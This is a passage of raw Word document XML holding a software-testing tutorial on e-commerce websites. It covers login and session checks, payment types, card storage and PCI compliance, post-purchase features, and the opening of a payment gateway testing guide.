          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>– this is checking that when both sort and filter have been applied, they remain as we paginate or more products are loaded.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A4086E" w:rsidRPr="00584E67" w:rsidRDefault="00A4086E" w:rsidP="00A4086E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="253"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Create Account and Login</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Some e-commerce websites allows you to purchase an item as a guest, i.e. without the need to create an account, and then an optional step to create an account when an order is placed.</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When an account is created, the user can login at any stage during a purchasing journey. It is important that we test all these variations along the user journey when testing e-commerce websites.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Purchase an item as a guest</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>– If the site permits, test that you can purchase an item without having to create an account.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Existing and new accounts</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>– purchase an item with an existing account and with a newly created account.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Create account and login before purchase</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>– this is to test that the item you purchase gets added and connected to the correct account. Also you should not be prompted to login again once you have already been logged in.</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Login redirects</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>– check the behavior of login feature on different pages. Some sites redirect the user back to the same page where they clicked the login link and some sites redirect the user to the accounts pages. This should be tested thoroughly.</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Login session</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>– when you login check that you stay logged in as you browse products. Also you need to test the behavior when the user doesn’t interact with the site for some time. Will the session expire after a period of time? Make sure the user has actually been logged out after the session times out.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Login and Logout</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>– when you are logged in, logout and make sure you are logged out and that you cannot access any of the accounts pages.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A4086E" w:rsidRPr="00584E67" w:rsidRDefault="00A4086E" w:rsidP="00A4086E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="253"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Payments</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Payments are an essential part of testing e-commerce websites. After all this is what allows users to purchase for their items without the need to call a number to place their order.</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Payment types</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">– Different payment types should all be tested, e.g. Credit Card, </w:t>
      </w:r>
      <w:r w:rsidR="00A37D03" w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>PayPal</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, Bank Transfers, </w:t>
      </w:r>
      <w:r w:rsidR="00A37D03" w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Installments</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>, etc</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rStyle w:val="Strong"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Card Details Storage</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>– does the site store customer’s credit card details? If so are they securely stored? Is it</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:hyperlink r:id="rId8" w:history="1">
        <w:r w:rsidRPr="00584E67">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="FF0000"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:t>PCI compliant</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A4086E" w:rsidRPr="00584E67" w:rsidRDefault="00A4086E" w:rsidP="00A4086E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="253"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Post Purchase Test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When we place an order, there are many actions that users can do related to their purchase. Testing the post purchase functionality is also an important aspect of testing e-commerce websites. These could be:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A4086E" w:rsidRPr="00584E67" w:rsidRDefault="00A4086E" w:rsidP="00EC39D9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>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Cancel the order or change the quantity of the order.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A4086E" w:rsidRPr="00584E67" w:rsidRDefault="00A4086E" w:rsidP="00EC39D9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>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Review your recent order and history of purchased items.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A4086E" w:rsidRPr="00584E67" w:rsidRDefault="00A4086E" w:rsidP="00EC39D9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>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Changes to the account, such as billing address, shipping address, change password, change profile information such as name, email address and even deleting an account.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No doubt that testing e-commerce websites is challenging and requires a lot of skill. This article is just the tip of the iceberg of all the relevant test cases that can be executed when testing e-commerce websites and it can be used as a starting point.</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There are a lot more </w:t>
      </w:r>
      <w:r w:rsidR="00F61A68" w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>functionality</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> to be tested as part of testing e-commerce websites such as:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A4086E" w:rsidRPr="00584E67" w:rsidRDefault="00A4086E" w:rsidP="00EC39D9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>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Product carousels and recommended products.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A4086E" w:rsidRPr="00584E67" w:rsidRDefault="00A4086E" w:rsidP="00EC39D9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>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Correct display of information on the Product Details Page which is usually content heavy.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A4086E" w:rsidRPr="00584E67" w:rsidRDefault="00A4086E" w:rsidP="00EC39D9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>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Database of product – how is the data modified after an item is purchased?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A4086E" w:rsidRPr="00584E67" w:rsidRDefault="00A4086E" w:rsidP="00EC39D9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>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lastRenderedPageBreak/>
        <w:t>Warehouse System – how is the warehouse or third-party gets notified when an order is placed?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A4086E" w:rsidRPr="00584E67" w:rsidRDefault="00A4086E" w:rsidP="00EC39D9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="411" w:lineRule="atLeast"/>
        <w:ind w:left="633"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:t>Contacting the customer, confirmation emails, contents of the email, returns, complaints, etc…</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A4086E" w:rsidRPr="00584E67" w:rsidRDefault="00A4086E" w:rsidP="00A4086E">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What’s most important when testing e-commerce websites is to make sure that each feature has correctly implemented its </w:t>
      </w:r>
      <w:r w:rsidR="00742F7F" w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>requirements?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005B1A8A" w:rsidRPr="00584E67" w:rsidRDefault="005B1A8A" w:rsidP="005B1A8A">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">E commerce is Electronic </w:t>
      </w:r>
      <w:r w:rsidR="00F242B0" w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>commerce:</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Buying and selling on the net.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005B1A8A" w:rsidRPr="00584E67" w:rsidRDefault="005B1A8A" w:rsidP="005B1A8A">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">OS commerce: Shopping cart software, which enable you to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>to</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> sell products on the net.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005B1A8A" w:rsidRPr="00584E67" w:rsidRDefault="005B1A8A" w:rsidP="005B1A8A">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="411" w:afterAutospacing="0" w:line="411" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>osCommerce</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> is an open source shopping cart and management software that allows people like you and me to sell products online through a website and checkout/payment solution. Open source means that it is ideal for developers since you can download the files and modify them in any way to meet your needs. </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>eCommerce</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> itself is the process of buying or selling online through a website or </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>payment.checkout</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> solution.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005B1A8A" w:rsidRPr="00584E67" w:rsidRDefault="005B1A8A" w:rsidP="00A4086E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="411" w:afterAutospacing="0" w:line="411" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="005B1A8A" w:rsidRPr="00584E67" w:rsidRDefault="005B1A8A" w:rsidP="00A4086E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="411" w:afterAutospacing="0" w:line="411" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D501FB" w:rsidRPr="00584E67" w:rsidRDefault="00D501FB" w:rsidP="00D501FB">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="281" w:line="449" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>Payment Gateway System:</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A payment gate-way system is an e-commerce application service that </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>approves</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> credit card payment for online purchases. Payment gateways safeguard the credit card details by encrypting sensitive information like credit card numbers, account holder details and so on. This information is passed safely between the customer and the merchant and vice versa.</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Modern payment gateways also </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t>securely approve</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
        <w:t> payments via debit cards, electronic bank transfers, cash cards, reward points etc.</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In this tutorial we will learn</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D501FB" w:rsidRPr="00584E67" w:rsidRDefault="00B84F48" w:rsidP="00EC39D9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="449" w:lineRule="atLeast"/>
        <w:ind w:left="374"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId9" w:anchor="1" w:history="1">
        <w:r w:rsidR="00D501FB" w:rsidRPr="00584E67">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="70BDCD"/>
          </w:rPr>
          <w:t>Types of Payment Gateway System</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00D501FB" w:rsidRPr="00584E67" w:rsidRDefault="00B84F48" w:rsidP="00EC39D9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="449" w:lineRule="atLeast"/>
        <w:ind w:left="374"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId10" w:anchor="2" w:history="1">
        <w:r w:rsidR="00D501FB" w:rsidRPr="00584E67">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="70BDCD"/>
          </w:rPr>
          <w:t>Testing Types for Payment Gateway System</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00D501FB" w:rsidRPr="00584E67" w:rsidRDefault="00B84F48" w:rsidP="00EC39D9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="449" w:lineRule="atLeast"/>
        <w:ind w:left="374"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId11" w:anchor="3" w:history="1">
        <w:r w:rsidR="00D501FB" w:rsidRPr="00584E67">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="70BDCD"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Test Preparation for Testing Payment Gateway</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00D501FB" w:rsidRPr="00584E67" w:rsidRDefault="00B84F48" w:rsidP="00EC39D9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="449" w:lineRule="atLeast"/>
        <w:ind w:left="374"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId12" w:anchor="4" w:history="1">
        <w:r w:rsidR="00D501FB" w:rsidRPr="00584E67">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="70BDCD"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Sample Test Cases for Payment Gateway Testing</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="007359F2" w:rsidRPr="007359F2" w:rsidRDefault="00B84F48" w:rsidP="007359F2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="449" w:lineRule="atLeast"/>
        <w:ind w:left="374"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId13" w:anchor="5" w:history="1">
        <w:r w:rsidR="00D501FB" w:rsidRPr="00584E67">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="70BDCD"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Things to consider before Buying Gateway Package</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00D501FB" w:rsidRPr="00584E67" w:rsidRDefault="00D501FB" w:rsidP="00D501FB">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="281" w:line="449" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="343434"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:noProof/>
          <w:color w:val="70BDCD"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="3811905" cy="2529205"/>
            <wp:effectExtent l="19050" t="0" r="0" b="0"/>
            <wp:docPr id="1" name="Picture 1" descr="http://cdn.guru99.com/images/6-2015/payment_gateway.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guru99.com/images/6-2015/payment_gateway.png">
                      <a:hlinkClick r:id="rId14"/>
                    </pic:cNvPr>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId15" cstate="print"/>
                    <a:srcRect/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3811905" cy="2529205"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
